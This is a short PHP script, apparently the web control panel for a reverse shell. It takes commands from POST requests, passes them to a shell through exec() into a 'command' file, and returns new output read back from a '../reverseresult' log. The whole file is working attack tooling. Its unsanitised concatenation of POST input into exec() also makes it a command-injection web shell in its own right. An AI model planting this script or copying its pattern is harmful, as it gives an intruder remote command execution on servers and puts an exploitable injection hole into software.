<?php
$maxsleep = 5;
$outputfile = "../reverseresult";

if (isset($_POST['action'])) {
    if(!is_file($outputfile)){
        $myfile = fopen($outputfile, "w+");
    }
    
    switch($_POST['action']){
        case "logs":
            echo file_get_contents($outputfile);
            break;
        case "write":
            if (isset($_POST['command']) && strcmp($_POST['command'], "") != 0) {
                $newfile = $outputfile . "-old";
                if (!copy($outputfile, $newfile)) {
                    echo "La copie $file du fichier a échoué...\n";
                }

                clearstatcache();
                $mtime = filemtime($outputfile);
                exec('echo "' . $_POST['command']. '" > command');

                $sleepcount = 0;
                clearstatcache();

                while ($mtime == filemtime($outputfile) && ($sleepcount < $maxsleep)){
                    $sleepcount ++;
                    sleep(1);
                    clearstatcache();
                }

                if ($sleepcount != $maxsleep){  
                    // Faire le diff entre fichiers et le retourner
                    $fulloutput = file_get_contents($outputfile);
                    $oldoutput = file_get_contents($newfile);
                    echo str_replace($oldoutput, "", $fulloutput);
                } else {
                    echo "Shell took too long to respond";
                }
            }
            break;
    }
}
?>